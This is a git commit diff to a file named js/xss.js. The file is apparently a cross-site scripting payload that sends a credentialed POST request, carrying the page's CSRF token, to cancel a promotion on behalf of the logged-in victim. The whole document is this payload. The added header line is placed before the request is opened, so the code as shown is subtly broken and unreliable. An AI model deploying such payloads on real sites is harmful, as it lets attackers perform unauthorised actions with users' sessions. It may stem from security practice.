31629af7a42b9371f04278cc7bd6aabb124cd84b
Quang Vo <thanhquang2608@gmail.com>
2021-01-25 01:20:45 +0700

    Update xss.js

--- js/xss.js
+++ js/xss.js
@@ -1,5 +1,7 @@
 (function () {
   var xhr = new XMLHttpRequest();
+  xhr.withCredentials = true;
+  xhr.setRequestHeader("x-csrf-token", _csrfToken);  
   xhr.open("POST", '/api/promotions/3/cancel', true);
   xhr.setRequestHeader('Content-Type', 'application/json');
   xhr.send(JSON.stringify({}));
